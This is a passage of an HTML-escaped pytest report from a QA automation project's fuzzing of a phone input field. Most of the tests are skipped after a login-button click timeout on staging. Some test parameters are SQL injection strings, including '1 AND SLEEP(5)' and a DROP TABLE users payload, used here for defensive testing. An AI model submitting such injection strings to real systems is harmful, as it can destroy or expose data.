Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1 AND SLEEP(5)&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1 AND SLEEP(5)&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1 AND SLEEP(5)&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;NaN&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;NaN&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;NaN&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-\&#34;&#39;); DROP TABLE users; --\&#34;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-\&#34;&#39;); DROP TABLE users; --\&#34;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-\&#34;&#39;); DROP TABLE users; --\&#34;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    51 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0\\\\u200bdata&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0\\\\u200bdata&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0\\\\u200bdata&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;0&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u0645\\u0631\\u062d\\u0628\\u0627 \\u0628\\u0627\\u0644\\u0639\\u0627\\u0644\\u0645&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u0645\\u0631\\u062d\\u0628\\u0627 \\u0628\\u0627\\u0644\\u0639\\u0627\\u0644\\u0645&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u0645\\u0631\\u062d\\u0628\\u0627 \\u0628\\u0627\\u0644\\u0639\\u0627\\u0644\\u0645&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;-1&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;-1&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;-1&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\uff21\\uff22\\uff23&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\uff21\\uff22\\uff23&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\uff21\\uff22\\uff23&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\n\\\\n\\\\n&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\n\\\\n\\\\n&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\n\\\\n\\\\n&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_generates_diverse_inputs&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_generates_diverse_inputs&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_generates_diverse_inputs&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_deterministic&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_deterministic&#34;, &#34;duration&#34;: &#34;57 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_phase4_verification_fuzzer_deterministic&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;57 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}]}, &#34;renderCollapsed&#34;: [&#34;passed&#34;], &#34;initialSort&#34;: &#34;result&#34;, &#34;title&#34;: &#34;qa20-fuzzing.html&#34;}"></div>
+    <script>
